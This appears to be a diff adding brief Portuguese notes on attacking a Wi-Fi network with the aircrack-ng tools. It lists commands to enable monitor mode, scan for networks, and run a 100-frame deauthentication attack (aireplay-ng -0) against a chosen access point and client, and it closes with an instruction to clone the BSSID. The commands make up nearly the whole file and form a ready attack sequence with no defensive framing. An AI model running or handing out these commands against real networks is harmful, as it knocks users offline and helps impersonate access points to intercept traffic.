@@ -1,0 +1,11 @@
+airmon-ng start wlan0
+ifconfig
+
+airodump-ng wlan0mon
+airodump-ng wlan0mon -c (canal)
+
+#deixar um terminal monitorando e outro atacando
+
+aireplay-ng -0 100 -a BSSID -c BSSID2 wlan0mon
+vai aparecer o nome da rede e o nome do dispositivo hackeado
+clonar o BSSID
